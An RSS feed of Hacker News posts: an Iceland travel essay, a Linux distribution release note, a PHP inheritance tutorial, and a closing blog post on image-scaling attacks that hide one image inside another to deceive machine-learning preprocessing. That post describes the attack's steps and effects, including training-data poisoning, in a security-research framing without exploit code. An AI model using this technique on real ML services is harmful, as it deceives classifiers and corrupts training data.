<p><strong>Table of Contents</strong></p>

<ul>
  <li><a href="#flyover-country">Flyover Country</a></li>
  <li><a href="#welcome-to-iceland-heres-some-j%C3%BAn%C3%ADus-meyvant">Welcome to Iceland. Here‚Äôs some J√∫n√≠us Meyvant</a></li>
  <li><a href="#iceland-is-for-humans">Iceland is for humans</a></li>
  <li><a href="#from-lice-to-nice">From lice to nice</a></li>
  <li><a href="#small-is-weird-small-is-good">Small is weird. Small is good.</a></li>
  <li><a href="#big-is-hard---for-countries-and-the-internet-too">Big is hard - for countries, and the internet, too</a></li>
  <li><a href="#where-to-now">Where to now?</a></li>
  <li><a href="#this-is-where-i-leave-you">This is where I leave you</a></li>
  <li><a href="#further-reading-on-iceland">Further Reading on Iceland</a></li>
</ul>

<!-- END doctoc generated TOC please keep comment here to allow auto update -->

<h2 id="flyover-country">Flyover Country</h2>

<p>When I was younger and my family finally made it <a href="http://blog.vickiboykis.com/2014/05/upward-immigrant-toy-mobility-in-the-wild-1990s/">to the American middle class</a>, we went on vacations to Europe. Plane travel was a lot more boring in the days before cell phones, and I would spend a significant amount of any given flight tracking the progress of the tiny plane icon on the flickering screen. When Godthab, Greenland, and then the tiny dot labeled Reykjavik appeared on the legend, I knew we were close to our destination across the Atlantic.</p>

<p>For most traveling Americans, until very recently, Iceland was no more than a flyover destination. But the <a href="https://en.wikipedia.org/wiki/2008%E2%80%932011_Icelandic_financial_crisis">2008 financial crisis</a>, the eruption of <a href="https://en.wikipedia.org/wiki/Eyjafjallaj%C3%B6kull">Eyjafjallaj√∂kull</a>, and the filming of Game of Thrones <a href="http://icelandmag.visir.is/article/thingvellir-featured-first-episode-season-4-game-thrones">there</a>, combined with aggressive marketing and low pricing by Iceland‚Äôs two airlines have drastically improved Iceland‚Äôs standing on the map.</p>

<p>Today, if you talk to any pour-over coffee drinker living within driving distance of an Ikea, there‚Äôs a seventy-six bajillion percent chance they‚Äôve been. Since over <a href="https://www.vox.com/new-money/2016/10/18/13261804/iceland-tourism-on-the-rise">1.5 million tourists hit Iceland last year</a> it really seems like everyone I know has either been, or is headed north.</p>

<p>In spite of all that, Iceland is still not a country Americans really pay attention to. I mean, we don‚Äôt care about most things that aren‚Äôt Kardashian, but Iceland, nestled way up against the Arctic Circle with a population smaller than Cleveland, can be easy to overlook.  As such, I had no preconceived notions going in. But, almost immediately I was won over.</p>

<h2 id="welcome-to-iceland-heres-some-j√∫n√≠us-meyvant">Welcome to Iceland. Here‚Äôs some J√∫n√≠us Meyvant</h2>

<p>What amazed me the most was that there is a USB charging port right next to the TV screen of my Icelandair flight. I‚Äôve flown an average amount, and nowhere yet have I seen this feature in economy class on American planes.</p>

<p>At first glance, this, seems like a totally banal yuppie thing to get excited about. But if you are flying with a smartphone, it‚Äôs a HUGE relief not to have to worry about charging in the airport where you land, saving battery, and generally running around like crazy on what should be your vacation or business trip. You just plug in, and you‚Äôre ready to go. It‚Äôs a really small thing that makes a huge difference in peace of mind for travelers.</p>

<p>As we boarded, Icelandair also played <a href="https://soundcloud.com/recordrecords/junius-meyvant-neon-experience-1">soft mood music</a> from a <a href="https://play.spotify.com/user/icelandair">Spotify playlist</a>. To someone who is used to traveling within the American flight culture, where you‚Äôre lucky if the flight attendants throwing $14 bags of peanuts at you hit in the general vicinity of your torso, it was all very new. And, of course, you could track the flight path on your phone free of charge.</p>

<p><img src="https://raw.githubusercontent.com/vkblog/vkblog.github.io/master/public/img/flightrack.PNG" alt="viking"></p>

<p>It so happened that we went to Iceland because Mr. B was invited to a bachelor party there.  In my day, these parties were held at local dive bars where the floor was more Miller Lite than laminate, but that was before Instagram. I decided to tag along for a couple days before the party, because Iceland was so close, and because it‚Äôs been a while since I‚Äôve travelled further than the distance between the crib and the couch.</p>

<p>We got in at six in the morning, but even in my red-eyed haze, I could see just how pristine everything at Keflav√≠k Airport was. My freshly-charged phone immediately connected to Iceland‚Äôs Vodafone network without a glitch.  ‚ÄúWe‚Äôre here. Everything is clean and smells like Ikea,‚Äù I texted my mom.</p>

<p><img src="https://raw.githubusercontent.com/vkblog/vkblog.github.io/master/public/img/airport.png" width="400"></p>

<p>I had already booked a ticket on <a href="https://www.re.is/flybus/">Flybus</a>, which goes from Keflav√≠k to Reykjavik, online, so all we had to do was get on and wait. I‚Äôve never been brave enough to take public transportation from the airport anywhere I‚Äôve been, including even Israel, where I speak the language, but the website made it so easy. The bus, like the plane, had Wi-Fi, a feature we‚Äôd see being offered again and again on buses, in cafes, restaurants, and bookstores, like a lure to trap urban Americans wearing plaid button-downs.</p>

<h2 id="iceland-is-for-humans">Iceland is for humans</h2>

<p>From the get-go, there were a lot of things in Iceland that seemed like they were out of a fairy tale about what an ideal human life should look like, at least from the perspective of someone living in the United States.</p>

<p>For example, on our first day, our guide from <a href="http://www.iheartreykjavik.net/">I Heart Reykjavik</a>, took us on a walk through Reykjavik, stopping at a small building that looked like something out of Goldilocks and the Three Bears. ‚ÄúThat‚Äôs the prime minister‚Äôs office,‚Äù she told us. ‚ÄúNo guards, nothing. He just goes about his work here.‚Äù We walked on, towards another two-story building that looked like an office for a small-to-medium business.</p>

<p><img src="https://raw.githubusercontent.com/vkblog/vkblog.github.io/master/public/img/Althingi.JPG" alt="viking"></p>

<p>It was the national Parliament, the Al√æingi. ‚ÄúIt‚Äôs made up of 48% women,‚Äù our guide said.  ‚ÄúWe‚Äôre just short of 50%,‚Äù she continued ruefully. I have to admit, I had a sharp intake of breath. It sounded like an impossible miracle. But in Iceland, equality, and more importantly, humanity, shows itself in lots of different ways.</p>

<p>There is the USB charger so you don‚Äôt have to coddle your smartphone like an animal.  In the big picture, there is <a href="https://grapevine.is/mag/articles/2017/05/05/poll-most-icelanders-support-equal-pay-law/">gender equality</a>. Not only do women make up a large percentage of the workforce, but childcare is heavily subsidized, costing something like <a href="https://www.theguardian.com/commentisfree/2014/oct/28/iceland-women-feminist-paradise-gender-gap-pay">$180 a month per child</a> for eight hours of childcare, including food. Mr. B and I personally pay $800/month, and I know our daycare is on the cheaper end.</p>

<p><img src="https://raw.githubusercontent.com/vkblog/vkblog.github.io/master/public/img/woke.JPG" alt="viking"></p>

<p>There is also a large <a href="https://grapevine.is/news/2017/05/03/only-3400-unemployed-in-iceland/">social safety net</a>, healthcare, and all the goodies that make Scandinavia ‚Äì Scandinavia.</p>

<p>Additionally, I felt more like a treasured guest than a potential criminal when passing through Icelandic customs, more than I can say for my trip back to the country where I‚Äôm actually a citizen.</p>

<p>But there is a lot of humanity in the small things, too. For example, the tap water is not only potable, but delicious.</p>

<p><img src="https://raw.githubusercontent.com/vkblog/vkblog.github.io/master/public/img/water.jpeg" width="400"></p>

<p>When we went to buy a bottle of water at the supermarket, the clerk looked at us like we were crazy. ‚ÄúYou know it‚Äôs the same thing in the tap,‚Äù she said, motioning for us to put the bottle back. The shower water smells like sulfur, because all of Iceland gets its cold water from a glacier, and hot water from <a href="http://wakeupreykjavik.com/the-icelandic-water/">geothermal heating.</a></p>

<p>Then, there‚Äôs the matter of the prisons. The <a href="http://www.icenews.is/2016/05/26/old-prison-in-reykjavik-center-gets-a-new-role/#axzz4gOqBvd8b">old town prison in Reykjavik</a>, which had no wire fence around it, or even bars on the windows, grew too small (it can only house 16 prisoners) and is being reconsidered for repurpose as a cultural center.  The current prison population of Iceland is <a href="http://www.icenews.is/2016/05/26/old-prison-in-reykjavik-center-gets-a-new-role/#axzz4gOqBvd8b">153</a>, or less than one tenth of one percent of the population.</p>

<p>Oh, and everyone speaks nearly perfect English.</p>

<p>It seems very, very hard to find anything wrong with Iceland. Until you get to the financial crisis of 2008, when the three largest banks folded, the currency plummeted, and unparalleled levels of corruption were exposed in the government, leading to massive unemployment and genuine fear and panic.</p>

<p>But even as large and traumatic as that <a href="https://www.thebalance.com/iceland-financial-crisis-bankruptcy-and-economy-3306347">devastating moment of extremely poor judgement for the country</a>, was, Iceland now seems to have passed it, i<a href="http://www.bbc.com/news/business-35485876">f not with flying colors</a>, at least with more wisdom and grace than the U.S. could muster up during its own fall.  It‚Äôs true that the krona has fallen and Iceland experienced a brain drain after the crisis. But it‚Äôs also true that a restructuring of the economy has led to a significant decrease in unemployment. The bankers that caused the 2008 financial crisis <a href="https://www.bloomberg.com/news/features/2016-03-31/welcome-to-iceland-where-bad-bankers-go-to-prison">are also in prison</a>, where they ‚Äúspend their days doing laundry, working out in the jailhouse gym, and browsing the Internet.‚Äù ‚ÄúSometimes they go horseback riding,‚Äù our guide said.</p>

<p>The economy has been on the upswing since 2011, particularly with a lot of strength in the tourism sector, which the Icelandic government is heavily pushing - probably the reason all my friends have known about it. The low cost of the airfare to Iceland relative to Europe or even the West Coast in America, thanks to the <a href="http://www.nytimes.com/1994/06/03/business/filling-a-trans-atlantic-air-niche.html?pagewanted=all">hub and spoke model</a> (Iceland is a huge place for flights from Europe and the United States to connect, thus maximizing capacity and optimizing costs for travelers), is huge.</p>

<h2 id="from-lice-to-nice">From lice to nice</h2>

<p>How did Iceland get to this point?  Originally settled in the 10th century by Vikings (and any <a href="http://www.irishtimes.com/news/why-people-in-iceland-look-just-like-us-1.1104676">Irish slaves</a> they picked up on the way), the island was not a very hospitable place.  When the settlers first came, there were almost no native animal species, so they had to bring by boat all the livestock they could to survive. There were also few trees, meaning most houses were made of mud and turf. Life was simply miserable for the first thousand years of Iceland‚Äôs existence.</p>

<p><img src="https://raw.githubusercontent.com/vkblog/vkblog.github.io/master/public/img/thingvallir.JPG" alt="viking"></p>

<p>Also, the weather in Iceland is terrible. There are two seasons: rain, and <a href="https://en.wikipedia.org/wiki/Laki">lava</a>. Exposed to both the Arctic wind and laid bare to all the vagaries of the Atlantic Ocean, it rains at least a little every day, in spurts. It was sunny for maybe 15 minutes that I was there. On a particularly windy day, we went <a href="http://eldhestar.is/">riding</a> on the <a href="http://www.visiticeland.com/things-to-do/activities/the-icelandic-horse">small, sturdy horses</a> that are descendants of the original horses the Vikings brought over (no imports are allowed to keep the purity of the breed), and all I could think about, instead of focusing on the beautiful, broody landscape of Hverager√∞i was about how many Vikings died of pneumonia and ear infections.</p>

<p><img src="https://raw.githubusercontent.com/vkblog/vkblog.github.io/master/public/img/us.JPG" alt="viking"></p>

<p>Things got marginally better over the centuries with more established trade routes, but as late as the the 1800s, men were climbing vertical cliffs plunging to the sea to steal sea bird eggs from ledges. Without these natural ‚Äúpantries‚Äù, a large amount of Icelanders would likely have starved. If you weren‚Äôt killed by hunger, the climate, or <a href="https://en.wikipedia.org/wiki/Turkish_Abductions">random Turkish raiding parties</a>,  there were always the eagles, one of the only native bird species to grace the island.</p>

<p>The economy really kicked into gear when exposed to the economic crosswinds of World War II, and, of course the British and the Americans. Once the economy took off, it‚Äôs been going. Iceland is now diversified away ‚Ä¶</p></article></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="http://blog.vickiboykis.com/2017/05/10/good-things-don%27t-scale/">http://blog.vickiboykis.com/2017/05/10/good-things-don%27t-scale/</a></em></p>]]>
            </description>
            <link>http://blog.vickiboykis.com/2017/05/10/good-things-don%27t-scale/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927952</guid>
            <pubDate>Thu, 29 Oct 2020 06:48:10 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UbuntuDDE Groovy Gorilla Release Note]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927837">thread link</a>) | @reddotX
<br/>
October 28, 2020 | https://ubuntudde.com/blog/ubuntudde-remix-groovy-gorilla-release-note/ | <a href="https://web.archive.org/web/*/https://ubuntudde.com/blog/ubuntudde-remix-groovy-gorilla-release-note/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-26358" itemtype="https://schema.org/CreativeWork" itemscope="itemscope">

	
	
<div>

	
	<!-- .entry-header -->

	
	<div itemprop="text">

		
		
<p>Hello community! Firstly, on behalf of the team and myself,  I‚Äôd like to thank the UbuntuDDE Remix Community and our precious donors, patrons, sponsors, supporters and well-wishers for motivating and supporting us for our next release.  We had an outstanding journey of 6 months after the successful launch of UbuntuDDE Remix 20.04 LTS in April and we hope you‚Äôll love the distribution more with this release. </p>



<p>In the past 6 months, we had few ups and downs but finally got our way to successfully port the beautiful and modern desktop environment from Deepin v20. Personally, I‚Äôd like to thank Felix Yan (from Arch Linux), David Mohammed (from Ubuntu Budgie) and everyone else for always supporting and helping us throughout the journey.</p>





<p>And today, we‚Äôre back with another exciting release, UbuntuDDE Remix 20.10 codenamed ‚Äúgroovy‚Äù (Groovy Gorilla) . Groovy is a non-LTS release which will have support for the next nine months till July 2021. This release can be considered as the most awaited release for the community as it is shipped with the fresh new Deepin Desktop Environment from Deepin v20.</p>




<h3>Key features of UbuntuDDE Remix Groovy</h3>



<ul><li>Ubuntu 20.10 Groovy base system.</li><li>Deepin Desktop Environment from Deepin v20.</li><li>New native applications preinstalled including Deepin Music, Device Manager, Deepin Movies, Image Viewer, Boot Maker,  System Monitor, Deepin Calculator, Deepin Text Editor, Deepin Terminal and more.</li><li>Firefox 81.0.2 as default web browser.</li><li>LibreOffice 7.0.2.2 as default office package.</li><li>Latest Ubuntu base packages preinstalled.</li><li>Linux Kernel 5.8.0 and Kwin window manager as default ported from Deepin‚Äôs fork of Kwin.</li><li>New beautiful wallpapers and assets from the UbuntuDDE Remix Team and Deepin.</li><li>Calamares Installer for easy Installation of the Distribution.</li><li>Snap plugin for Software Center preinstalled.</li><li>Future more exciting software packages through OTA updates.</li></ul>



<h3>Bug fixes after Beta release</h3>



<ul><li>Added: Open As Administrator on right click.</li><li>Added : Refresh button on right click.</li><li>Fixed: WiFi Network not showing nearest AP.</li><li>Fixed: Black shadow frame across the window.</li><li>Fixed: Rounded corners on the Dock.</li><li>Fixed: Blur on Notification Panel.</li><li>Fixed: Magic Lamp Effect not working properly.</li><li>Fixed: Lock screen wallpaper not changing.</li><li>Fixed: Minor glitches in windows manager.</li><li>Other minor bug fixes and improvements.</li></ul>



<h3>Recommended System Requirements</h3>



<div>
<div><div>




<div>
<div><div><div>
<figure><img src="https://i0.wp.com/images-na.ssl-images-amazon.com/images/I/51A-lXth2NL._SX397_BO1,204,203,200_.jpg?resize=190%2C250&amp;ssl=1" alt="" width="190" height="250" data-recalc-dims="1"></figure>
</div></div></div>



<div><div><div>
<h2><span id="Linux_Bible"></span>Linux Bible<span></span></h2>



<p>Linux Bible is the ultimate hands-on Linux user guide, whether you're a true beginner or a more advanced user navigating recent changes.</p>



</div></div></div>
</div>
</div></div></div>
<p>RAM: Minimum of 4 GB.<br>Drive Space: At least 20 GB free space.<br>CPU: At least 2 GHz Processor or better.</p>



<p>To try/install the Operating System, head towards our <a aria-label=" (opens in a new tab)" rel="noreferrer noopener" href="https://ubuntudde.com/download/" target="_blank">Download page</a> and to support our project financially, visit our <a href="https://ubuntudde.com/donate/">Donate page</a>. Learn more about this release, please visit the <a href="https://ubuntudde.com/features/">Features page</a> and checkout some screenshot collection in our <a aria-label="Digital Assets page (opens in a new tab)" rel="noreferrer noopener" href="https://ubuntudde.com/digital-assets/" target="_blank">Digital Assets page</a>.</p>



<p>If you encounter any issue or need help from the awesome community, visit our <a aria-label="Support page. (opens in a new tab)" href="https://ubuntudde.com/support/" rel="noreferrer noopener" target="_blank">Support page</a>. To report an issue or search for an existing bug, visit our <a href="https://github.com/ubuntudde/bugs" target="_blank" rel="noopener">Github Issue Tracker</a>.</p>







<p>Regards,<br><strong>Arun Kumar Pariyar,</strong><br>Project Lead, UbuntuDDE Remix</p>
<!-- AI CONTENT END 2 -->

		
		
			</div><!-- .entry-content .clear -->
</div>

	
</article></div>]]>
            </description>
            <link>https://ubuntudde.com/blog/ubuntudde-remix-groovy-gorilla-release-note/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927837</guid>
            <pubDate>Thu, 29 Oct 2020 06:25:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Object Oriented PHP]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24927751">thread link</a>) | @brendt_gd
<br/>
October 28, 2020 | https://front-line-php.com/object-oriented | <a href="https://web.archive.org/web/*/https://front-line-php.com/object-oriented">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article>
            
<div>
    <p>Alan Kay, the inventor of the term ‚Äúobject-oriented programming‚Äù, told a story once during a talk more than 20 years ago. You can build a dog house using only a hammer, nails, planks, and just a little bit of skill. I figure even I would be able to build it given enough time. Once you've built it you've earned the skills and know-how, and could apply it to other projects. Next, you want to build a cathedral, using the same approach with your hammer, nails, and planks. It's a 100 times larger, but you've done this before ‚Äî right? It'll only take a little longer.</p>

    <p>While the scale went up by a factor of 100, its mass went up by a factor of 1.000.000 and its strength only by 10.000. Inevitably, the building will collapse. Some people plaster over the rubble, make it into a pyramid and say it was the plan all along; but you and I know what really went on.</p>

    <p>Alan used this metaphor to explain a critical problem he saw with ‚Äúmodern OOP‚Äù 20 years ago. I think it still holds today: we've taken the solution to a problem ‚Äî OO code ‚Äî we've scaled it by a factor of 100, and expected it to work the same way. Today still, we don't think enough about architecture ‚Äî which is rather crucial if you're building a cathedral ‚Äî we use the OO solutions we learned without any extra thought. Most of us learned OO in isolation with small examples, and rarely at scale. In most real life projects, you cannot simply apply the patterns you've learned and expect everything to fall into place the same way it did with Animals, Cats, and Dogs.</p>
    <p>This reckless scaling of OO code is what cause many people to voice their disapproval of it in recent years. Personally I believe OOP is as good a tool as any other ‚Äî functional programming being the modern-day popular contestant ‚Äî <em>if</em> used correctly.</p>
    <p>My takeaway from Alan's vision is that each object is a little program on its own, with its own internal state. Objects send messages between each other ‚Äî packages of immutable data ‚Äî which other objects can interpret and react to. You can't write all code this way, and that's fine ‚Äî it's fine to not blindly follow these rules.
        Still, I have experienced the positive impact of this mindset first hand. Thinking of objects as little standalone programs, I started writing parts of my code in a different style. I hope that, now that we're going to look at OOP, you'll keep Alan's ideas in mind. Don't blindly apply patterns and principles. Try to look at what you're building as a whole.</p>
    <h2 id="the-pitfall-of-inheritance"><a href="#the-pitfall-of-inheritance">#</a> The pitfall of inheritance</h2>
    <p>I found it difficult to believe at first, but classes and inheritance have nothing to do with OOP the way Alan envisioned it. That doesn't mean they are bad things per se, but it <em>is</em> good to think about their purpose and how we can use, as well as abuse them.
        Alan's vision only described objects ‚Äî it didn't describe how those objects were created. Classes were added later as a convenient way to manage objects, but they are only an implementation detail, not the core idea of OOP. With classes came inheritance, another a useful tool when used correctly. That hasn't been the case though: the problem Alan tried to address 20 years ago still exists today.</p>
    <p>One of the acclaimed strengths of OOP is that it models our code in ways humans think about the world. In reality though, we rarely think in terms of abstractions and inheritance. Instead of using inheritance in places where it actually makes sense, we've been abusing it as a way to share code, and to configure objects in an obscure way.
        I'm going to show you a great example that illustrates this problem, though I want to say up front that it isn't my own: it's Sandi Metz's, a great teacher on the subject of OOP. Let's take a look.</p>
    <p>There's a children's nursery rhyme called ‚ÄúThe House That Jack Built‚Äù (it's also a horror movie but that's unrelated).
        It starts like this:</p>
    <pre><code>This is the house that Jack built.</code></pre>
    <p>Every iteration there's a sentence added to it:</p>
    <pre><code>This is the malt that lay in
        the house that Jack built.</code></pre>
    <p>And next:</p>
    <pre><code>This is the rat that ate
        the malt that lay in
        the house that Jack built.</code></pre>
    <p>Get it? This is the final poem:</p>
    <pre><code>This is the horse and the hound and the horn that belonged to
        the farmer sowing his corn that kept
        the rooster that crowed in the morn that woke
        the priest all shaven and shorn that married
        the man all tattered and torn that kissed
        the maiden all forlorn that milked
        the cow with the crumpled horn that tossed
        the dog that worried
        the cat that killed
        the rat that ate
        the malt that lay in
        the house that Jack built.</code></pre>
    <p>Let's code this together, I'll be using PHP. We're going to make a program that you can ask a given iteration, and it will produce the poem up until that point. Let's do it in an OO way. We start by adding all parts into a data array within a class; let's call that class <code><span>PoemGenerator</span></code> ‚Äî sounds very OO, right? Good.</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    <span>private</span> <span>static</span> <span>array</span> <span>$data</span> = [
        <span>'the horse and the hound and the horn that belonged to'</span>,
        <span>'the farmer sowing his corn that kept'</span>,
        <span>'the rooster that crowed in the morn that woke'</span>,
        <span>'the priest all shaven and shorn that married'</span>,
        <span>'the man all tattered and torn that kissed'</span>,
        <span>'the maiden all forlorn that milked'</span>,
        <span>'the cow with the crumpled horn that tossed'</span>,
        <span>'the dog that worried'</span>,
        <span>'the cat that killed'</span>,
        <span>'the rat that ate'</span>,
        <span>'the malt that lay in'</span>,
        <span>'the house that Jack built'</span>,
    ];
}</code></pre>
    <p>Now let's add two methods <code><span>generate</span></code> and <code><span>phrase</span></code>. <code><span>generate</span></code> will return the end result, and <code><span>phrase</span></code> is an internal function that glues the parts together.</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    

    <span>public</span> <span><span>function</span> <span>generate</span><span>(<span>int</span> $number)</span>: <span>string</span>
    </span>{
        <span>return</span> <span>"This is {$this-&gt;<span>phrase</span>($number)}."</span>;
    }

    <span>protected</span> <span><span>function</span> <span>phrase</span><span>(<span>int</span> $number)</span>: <span>string</span>
    </span>{
        $parts = <span>array_slice</span>(<span>self</span>::<span>$data</span>, -$number, $number);

        <span>return</span> <span>implode</span>(<span>"\n        "</span>, $parts);
    }
}</code></pre>
    <p>It seems like our solution works: we can use <code><span>phrase</span></code> to take x-amount of items from the end of our data array and implode those into one phrase; next we use <code><span>generate</span></code> to wrap the final result with <code>This is</code> and <code>.</code>. By the way, I implode on that spaced delimiter just to format the output a little nicer.</p>
    <pre><code>$generator = <span>new</span> <span>PoemGenerator</span>();

$generator-&gt;<span>generate</span>(<span>4</span>);




</code></pre>
    <p>Exactly what we'd expect the result to be.</p>
    <hr>
    <p>Then comes along‚Ä¶ a new feature request. Let's build a <em>random</em> poem generator: it will randomise the order of the phrases. How do we solve this in a clean way without copying and duplicating code? Inheritance to the rescue ‚Äî right?
        First let's do a little refactor, let's add a protected <code><span>data</span></code> method, so that we have a little more flexibility in what it actually returns:</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    <span>protected</span> <span><span>function</span> <span>phrase</span><span>(<span>int</span> $number)</span>: <span>string</span>
    </span>{
        $parts = <span>array_slice</span>(<span><span>$this</span>-&gt;<span>data</span>()</span>, -$number, $number);

        <span>return</span> <span>implode</span>(<span>"\n        "</span>, $parts);
    }

<span>    <span>protected</span> <span><span>function</span> <span>data</span><span>()</span>: <span>array</span>
    </span>{
        <span>return</span> [
            <span>'the horse and the hound and the horn that belonged to'</span>,
            
            <span>'the house that Jack built'</span>,
        ];
    }</span>}</code></pre>
    <p>Next we build our <code><span>RandomPoemGenerator</span></code>:</p>
    <pre><code><span><span>class</span> <span>RandomPoemGenerator</span> <span>extends</span> <span>PoemGenerator</span>
</span>{
    <span>protected</span> <span><span>function</span> <span>data</span><span>()</span>: <span>array</span>
    </span>{
        $data = <span>parent</span>::<span>data</span>();

        <span>shuffle</span>($data);

        <span>return</span> $data;
    }
}</code></pre>
    <p>How great is inheritance! We only needed to override a small part of our code, and everything works just as expected!</p>
    <pre><code>$generator = <span>new</span> <span>RandomPoemGenerator</span>();

$generator-&gt;<span>generate</span>(<span>4</span>);</code></pre>
    <pre><code>This is the priest all shaven and shorn that married
        the cow with the crumpled horn that tossed
        the man all tattered and torn that kissed
        the rooster that crowed in the morn that woke.</code></pre>
    <p>Awesome!</p>
    <hr>
    <p>Once again‚Ä¶ a new feature request: an echo generator: it repeats every line a second time. So you'd get this:</p>
    <pre><code>This is the malt that lay in the malt that lay in
        the house that Jack built the house that Jack built.</code></pre>
    <p>We can solve this; inheritance ‚Äî right?</p>
    <p>Let's again do a small refactor in <code><span>PoemGenerator</span></code>, just to make sure our code stays clean! Let's extract the array slicing functionality in <code><span>phrase</span></code> to its own method, because that's a better separation of concerns ‚Äî which we learned is a good thing!</p>
    <pre><code><span><span>class</span> <span>PoemGenerator</span>
</span>{
    

    <span>protected</span> <span><span>function</span> <span>phrase</span><span>(int $number)</span>: <span>string</span>
    </span>{
        $parts = <span><span>$this</span>-&gt;<span>parts</span>($number)</span>;

        <span>return</span> <span>implode</span>(<span>"\n        "</span>, $parts);
    }

<span>    <span>protected</span> <span><span>function</span> <span><span>parts</span></span><span>(int $number)</span>: <span>array</span>
    </span>{
        <span>return</span> <span>array_slice</span>(<span>$this</span>-&gt;<span>data</span>(), -$number, $number);
    }</span>}</code></pre>
    <p>Having refactored this, implementing <code><span>EchoPoemGenerator</span></code> is again very easy:</p>
    <pre><code><span><span>class</span> <span>EchoPoemGenerator</span> <span>extends</span> <span>PoemGenerator</span>
</span>{
    <span>protected</span> <span><span>function</span> <span>parts</span><span>(<span>int</span> $number)</span>: <span>array</span>
    </span>{
        <span>return</span> <span>array_reduce</span>(
            <span>parent</span>::<span>parts</span>($number),
            <span>fn</span> (<span><span>array</span></span> $output, <span>string</span> $line) =&gt; [...$output, <span>"{$line} {$line}"</span>],
            []
        );
    }
}</code></pre>
    <p>Can we take a moment to appreciate the power of inheritance? We've created two different implementations of our original <code><span>PoemGenerator</span></code>, and have <em>only</em> overridden the parts that differ from it in <code><span>RandomPoemGenerator</span></code> and <code><span>EchoPoemGenerator</span></code>. We've even used SOLID principles to ensure that our code is decoupled so that it's easy to override specific parts. This is what great OOP is about ‚Äî right?</p>
    <hr>
    <p>One more time‚Ä¶ another feature request: please make one more implementation, one that combines both the random and echo behaviour: <code><span>RandomEchoPoemGenerator</span></code>.</p>
    <p>Now what? Which class will that one extend?</p>
    <p>If we're extending <code><span>PoemGenerator</span></code>, we'll have to override both our <code><span>data</span></code> and <code><span>parts</span></code> methods, essentially copying code from both <code><span>RandomPoemGenerator</span></code> and <code><span>EchoPoemGenerator</span></code>. That's bad design, ‚Ä¶</p></div></article></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://front-line-php.com/object-oriented">https://front-line-php.com/object-oriented</a></em></p>]]>
            </description>
            <link>https://front-line-php.com/object-oriented</link>
            <guid isPermaLink="false">hacker-news-small-sites-24927751</guid>
            <pubDate>Thu, 29 Oct 2020 06:06:36 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Image Scaling Attacks]]>
            </title>
            <description>
<![CDATA[
Score 427 | Comments 69 (<a href="https://news.ycombinator.com/item?id=24927655">thread link</a>) | @wendythehacker
<br/>
October 28, 2020 | https://embracethered.com/blog/posts/2020/husky-ai-image-rescaling-attacks/ | <a href="https://web.archive.org/web/*/https://embracethered.com/blog/posts/2020/husky-ai-image-rescaling-attacks/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section>
    <p>This post is part of a series about machine learning and artificial intelligence. Click on the blog tag ‚Äúhuskyai‚Äù to see related posts.</p>
<ul>
<li><a href="https://embracethered.com/blog/posts/2020/husky-ai-walkthrough/">Overview</a>: How Husky AI was built, threat modeled and operationalized</li>
<li><a href="https://embracethered.com/blog/posts/2020/husky-ai-threat-modeling-machine-learning/">Attacks</a>: Some of the attacks I want to investigate, learn about, and try out</li>
</ul>
<p>A few weeks ago while preparing demos for my GrayHat 2020 - Red Team Village presentation I ran across ‚ÄúImage Scaling Attacks‚Äù in <a href="https://www.usenix.org/system/files/sec20-quiring.pdf">Adversarial Preprocessing: Understanding and Preventing Image-Scaling Attacks in Machine Learning</a> by Erwin Quiring, et al.</p>
<p>I thought that was so cool!</p>
<h2 id="what-is-an-image-scaling-attack">What is an image scaling attack?</h2>
<p>The basic idea is to hide a smaller image inside a larger image (it should be about 5-10x the size). The attack is easy to explain actually:</p>
<ol>
<li>Attacker crafts a malicious input image by hiding the desired target image inside a benign image</li>
<li>The image is loaded by the server</li>
<li>Pre-processing resizes the image</li>
<li>The server acts and makes decision based on a different image then intended</li>
</ol>
<p>My goal was to hide a husky image inside another image:</p>
<p><a href="https://embracethered.com/blog/images/2020/image-rescale-attack.gif"><img src="https://embracethered.com/blog/images/2020/image-rescale-attack.gif" alt="Image Rescaling Attack"></a></p>
<p>Here are the two images I used - before and after the modification:
<a href="https://embracethered.com/blog/images/2020/image-rescaling-attack-schoenbrunn.png"><img src="https://embracethered.com/blog/images/2020/image-rescaling-attack-schoenbrunn.png" alt="Image Rescaling Attack"></a></p>
<p>If you look closely, you can see that the second image does have some strange dots all around. But this is not noticable when viewed in smaller version.</p>
<p>You can find the code on <a href="https://github.com/EQuiw/2019-scalingattack">Github</a>. I used Google Colab to run it, and there were some errors initialy but it worked - let me know if interested and I can clean up and share the Notebook also.</p>
<h2 id="rescaling-and-magic-happens">Rescaling and magic happens!</h2>
<p>Now, look what happens when the image is loaded and resized with <code>OpenCV</code> using default settings:</p>
<p><a href="https://embracethered.com/blog/images/2020/image-rescaling-attack.png"><img src="https://embracethered.com/blog/images/2020/image-rescaling-attack.png" alt="Image Rescaling Attack"></a></p>
<p>On the left you can see the original sized image, and on the left the same image downsized to 128x128 pixels.</p>
<p><strong>That‚Äôs amazing!</strong></p>
<p>The downsized image is an entirely different picture now! Of course I picked a husky, since I wanted to attack ‚ÄúHusky AI‚Äù and find another bypass.</p>
<h2 id="implications">Implications</h2>
<p>This can have a set of implications:</p>
<ol>
<li><strong>Training process:</strong> Images that poisen the training data (as pre-processing rescales images)</li>
<li><strong>Model queries:</strong> The model might predict on a different image than the one the user uploaded</li>
<li><strong>Non ML related attacks:</strong> This can also be an issue in other, non machine learning areas.</li>
</ol>
<p>I guess security never gets boring, there is always something new to learn.</p>
<h2 id="mitigations">Mitigations</h2>
<p>Turns out that Husky AI uses PIL and that was not vulnerable to this attack by default.</p>
